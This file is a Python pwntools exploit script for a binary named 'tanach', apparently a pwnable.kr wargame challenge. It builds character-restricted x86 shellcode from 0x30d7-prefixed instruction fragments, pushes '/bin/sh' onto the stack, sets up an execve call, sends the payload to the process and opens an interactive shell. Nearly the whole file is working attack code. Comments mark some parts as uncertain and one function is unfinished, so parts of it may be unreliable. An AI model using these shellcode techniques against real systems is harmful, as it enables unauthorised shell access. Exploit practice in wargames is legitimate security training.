# -*- coding: utf-8 -*-
from pwn import *

def xchg_ecx():
    return b'\x30\xd7\x91'

def inc_eax(n=1):
    return b'\x30\xd7\x40' * n

def dec_eax(n=1):
    return b'\x30\xd7\x48' * n

def set_eax(value, prev):
    diff = value - prev
    if diff > 0:
        return inc_eax(diff)
    else:
        return dec_eax(-diff)
    
def push_eax():
    return b'\x30\xd7\x50'

def push_al():
    shellcode = b''

    shellcode += b'\x30\xd7\x92' # xchg eax, edx
    shellcode += b'\x30\xd7\x96' # xchg eax, esp ///->esi #fixed
    shellcode += b'\x30\xd7\x48' # dec eax
    shellcode += b'\x30\xd7\x88\xd6\xb3\x30' # mov dh, dl; nop
    shellcode += b'\x30\xd7\x88\x30' # mov [eax], dh
    shellcode += b'\x30\xd7\x96' # xchg eax, esp ///->esi #fixed
    shellcode += b'\x30\xd7\x92' # xchg eax, edx

    return shellcode

def create_stack_string(byte_str):
    shellcode = b''
    last_value = 0

    for c in byte_str[::-1]:
        shellcode += set_eax(ord(c), last_value)
        shellcode += push_al()

        last_value = ord(c)
    
    shellcode += set_eax(0, last_value)

    return shellcode

def create_int_string():
    int_80 = 0xcd80
    

def main():
    buf = b''
    #buf = xchg_ecx()
    
    buf += inc_eax(0x10)
    buf +=  b'\x30\xd7\x96'  # xchange esi, eax 
    
    
    buf += b'\x30\xd7\x51\x30\xd7\x58' # push ecx; pop eax
    buf += create_stack_string('/bin/sh'.encode() + '\x00')
    buf += b'\x30\xd7\x56\x30\xd7\x5f' # push ////esi ; pop edi (mov edi, esp) fixed
    buf += create_stack_string(b'\x90\xcd\x80')
    buf += b'\x30\xd7\x51\x30\xd7\x58' # push ecx; pop eax
    buf += inc_eax(0x0b) # setting eax to execv code
    


    #push edi 
    #pop ebx
    buf += b'\x30\xd7\x57\x31\xd7\x5b' ###

    buf += b'\x31\xd7\x51\x31\xd7\x5a' #edi = execve
    
    #push esp, ret <--- push esi,ret #fixed
    buf += b'\x31\xd7\x56\x31\xd6\xc3' # pushing fake return address onto the stack and the ret TODO: esp update before push or after??
    open('temp.bin', 'wb').write(buf)
    print(len(buf))
    print(buf)
    # with open("aaa","wb") as f:
    #     f.write(buf)
    # return

    io = process('./tanach')
    #io = remote(host="pwnable.kr",port=9010)
    
    #attach_server(io,port=55555)
    #raw_input('')


    io.sendline(buf)
    
    #io.sendline(u'א')

    io.interactive()

if __name__ == '__main__':
    main()
